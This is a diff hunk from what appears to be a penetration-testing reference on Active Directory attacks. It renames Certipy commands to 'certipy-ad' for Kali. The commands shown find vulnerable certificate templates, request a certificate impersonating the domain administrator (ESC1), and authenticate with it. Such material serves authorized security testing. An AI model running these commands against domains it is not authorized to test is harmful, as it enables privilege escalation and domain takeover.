@@ -311,14 +311,15 @@ dacledit.py {domain}/{user}:{pass} -dc-ip {dc} -target {target_user} -action rea
 
 **Certipy (preferred tool):**
 ```
+# Kali installs the binary as `certipy-ad` (pip/pipx installs it as `certipy`).
 # Find vulnerable templates
-certipy find -u {user}@{domain} -p {pass} -dc-ip {dc} -vulnerable
+certipy-ad find -u {user}@{domain} -p {pass} -dc-ip {dc} -vulnerable
 
 # ESC1: Request cert as another user
-certipy req -u {user}@{domain} -p {pass} -dc-ip {dc} -ca {ca_name} -template {template} -upn administrator@{domain}
+certipy-ad req -u {user}@{domain} -p {pass} -dc-ip {dc} -ca {ca_name} -template {template} -upn administrator@{domain}
 
 # Authenticate with certificate
-certipy auth -pfx administrator.pfx -dc-ip {dc}
+certipy-ad auth -pfx administrator.pfx -dc-ip {dc}
 ```
 
 ## Analysis Framework
